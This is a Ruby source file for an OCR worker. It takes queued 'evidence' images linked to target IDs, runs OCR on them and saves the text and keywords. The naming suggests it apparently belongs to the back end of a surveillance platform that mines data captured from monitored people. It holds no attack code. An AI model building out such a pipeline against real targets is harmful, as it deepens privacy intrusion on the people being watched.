#
# OCR processing module
#
# the evidence to be processed are queued by the workers
#

require_relative 'leadtools'

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'fileutils'

module RCS
module OCR

class Processor
  extend RCS::Tracer

  def self.run
    db = Mongoid.database
    coll = db.collection('ocr_queue')

    trace :info, "OCR ready to go..."

    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if entry = coll.find_and_modify({query: {flag: OCRQueue::QUEUED}, update: {"$set" => {flag: OCRQueue::PROCESSED}}})
        process entry
      else
        trace :debug, "Nothing to do, waiting..."
        sleep 1
      end
    end
  end


  def self.process(entry)
    ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])

    start = Time.now

    temp = RCS::DB::Config.instance.temp(ev[:data]['_grid'].to_s)
    output = temp + '.ocr'

    # dump the binary to the temp directory
    file = RCS::DB::GridFS.get ev[:data]['_grid'], entry['target_id']
    File.open(temp, 'wb') {|d| d.write file.read}
    size = File.size(temp)

    trace :debug, "IMAGE: #{temp} (#{size.to_s_bytes})"

    # invoke the ocr on the temp file and get the result
    if LeadTools.transform(temp, output)
      raise "output file not found" unless File.exist?(output)
    else
      raise "unable to process"
    end

    ocr_text = File.open(output, 'r') {|f| f.read}

    FileUtils.rm_rf temp
    FileUtils.rm_rf output

    # update the evidence with the new text
    ev[:data][:body] = ocr_text
    ev[:kw] += ocr_text.keywords

    ev.save

    trace :info, "Evidence processed in #{Time.now - start} seconds (#{size.to_s_bytes})"

  rescue Exception => e
    trace :error, "Cannot process evidence: #{e.message}"
    #FileUtils.rm_rf temp
    FileUtils.mv temp, temp + '.jpg'
    exit!
  end


end

end #OCR::
end #RCS::